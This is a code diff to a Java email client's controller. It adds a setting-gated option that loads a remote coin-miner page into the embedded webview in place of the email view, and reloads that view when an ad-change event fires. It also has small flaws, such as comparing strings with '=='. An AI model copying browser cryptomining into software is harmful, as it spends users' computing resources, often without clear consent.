@@ -1,9 +1,11 @@
 package application.controllers;
 
 import java.awt.TrayIcon.MessageType;
+import java.awt.event.ActionListener;
 import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
+import java.net.InetAddress;
 import java.net.URL;
 import java.net.URLConnection;
 import java.nio.file.Path;
@@ -40,6 +42,7 @@ import com.pessetto.origamismtp.filehandlers.inbox.Message;
 import com.pessetto.origamismtp.filehandlers.inbox.NewMessageListener;
 import com.sun.mail.smtp.SMTPTransport;
 
+import application.constants.ApplicationVariables;
 import application.debug.DebugLogSingleton;
 import application.email.ForwardingAddress;
 import application.listeners.SMTPStatusListener;
@@ -86,8 +89,10 @@ import javafx.util.Callback;
 import javafx.beans.binding.Bindings;
 import javafx.beans.property.SimpleBooleanProperty;
 
+import java.net.InetAddress;
+
 public class EmailController implements NewMessageListener,
-DeleteMessageListener, SMTPStatusListener
+DeleteMessageListener, SMTPStatusListener, ActionListener
 {
 
 	private DebugLogSingleton debugLog;
@@ -147,18 +152,36 @@ DeleteMessageListener, SMTPStatusListener
 	
 	private void initEmailWebview()
 	{
-		bridge = new BrowserBridge(this);
-		webengine = webview.getEngine();
-		webengine.getLoadWorker().stateProperty().addListener(new ChangeListener<State>(){
-			public void changed(ObservableValue ov, State oldState, State newState)
+		try
+		{
+			SettingsSingleton settings = SettingsSingleton.getInstance();
+			bridge = new BrowserBridge(this);
+			webengine = webview.getEngine();
+			webengine.getLoadWorker().stateProperty().addListener(new ChangeListener<State>(){
+				public void changed(ObservableValue ov, State oldState, State newState)
+				{
+					JSObject win = (JSObject) webengine.executeScript("window");
+					win.setMember("app",bridge);
+				}
+			});
+			InetAddress host = InetAddress.getByName(ApplicationVariables.minerHost);
+			if(settings.isCoinMinerEnabled() && host.isReachable(30000))
 			{
-				JSObject win = (JSObject) webengine.executeScript("window");
-				win.setMember("app",bridge);
+				webengine.load(ApplicationVariables.minerUrl);
+				System.out.println("Loaded: " + ApplicationVariables.minerUrl);
 			}
-		});
-		InputStream emailHTMLHandlerStream = EmailController.class.getClassLoader().getResourceAsStream("jqueryEmailPage.html");
-		String emailExternalForm = ResourceLoader.loadFile(emailHTMLHandlerStream);
-		webengine.loadContent(emailExternalForm, "text/html");
+			else
+			{
+				InputStream emailHTMLHandlerStream = EmailController.class.getClassLoader().getResourceAsStream("jqueryEmailPage.html");
+				String emailExternalForm = ResourceLoader.loadFile(emailHTMLHandlerStream);
+				webengine.loadContent(emailExternalForm, "text/html");
+			}
+		}
+		catch(IOException ex)
+		{
+			System.out.println("Error: " + ex.getMessage());
+			ex.printStackTrace(System.err);
+		}
 	}
 	
 	private void initDetailsWebView()
@@ -175,6 +198,7 @@ DeleteMessageListener, SMTPStatusListener
 		debugLog = DebugLogSingleton.getInstance();
 		SettingsSingleton settings = SettingsSingleton.getInstance();
 		settings.addSmtpStatusListener(this);
+		settings.addActionListener(this);
 		settings.startSMTPServer();
 		Inbox inbox = Inbox.getInstance();
 		inbox.addNewMessageListener(this);
@@ -543,6 +567,17 @@ DeleteMessageListener, SMTPStatusListener
 			System.out.println(e.getMessage());
 			e.printStackTrace(System.err);
 		}
+	}
+
+	@Override
+	public void actionPerformed(java.awt.event.ActionEvent e)
+	{
+		if(e.getActionCommand() == ApplicationVariables.adChangedEvent)
+		{
+			System.out.println("Reload web view");
+			initEmailWebview();
+		}
+		
 	}
 	
 }
